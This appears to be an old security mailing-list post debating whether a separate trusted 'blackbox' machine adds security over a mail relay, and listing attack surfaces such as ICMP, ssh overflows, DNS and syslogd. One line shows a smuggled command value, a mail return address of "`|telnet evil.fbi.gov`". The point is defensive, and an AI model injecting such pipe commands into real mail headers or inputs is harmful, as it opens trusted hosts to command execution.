	This is a long standing debate in the security community.
Some folks like multiple box security.  Others point out that using
two boxes means both need to be well secured, and you have twice as
many places to make mistakes.

	Lets say the boxes are called workstation and blackbox.  If I
break into workstation, I can provide bogus files for blackbox.  Since
blackbox extends some trust to workstation, it might not be expecting
to see a message with a return address of "`|telnet evil.fbi.gov`".

	I'd argue that setting up a simple mailer which uses
workstation as a relay host gives you as much security, and lessens
your dependance on workstation, which we expect will be comprimised.
(Of course we expect ws to be comprimised.  Why else are we setting up
bb as a seperate machine?)

	Turning of getty and removing the swap file strike me as a bit
extreme.  A panic login system, otoh, that accepts a bad password and
wipes the disk, might not be a bad idea.  (Of course, if this becomes
popular, the bad guys will just rip out your disk and read it on
another machine.)

	Be awful tough if it only listens to ssh & smtp.  Are you sure
your kernel doesn't do anything bogus with ICMP?  Data overflows in
ssh or smap?  DNS, syslogd, tty overloads?
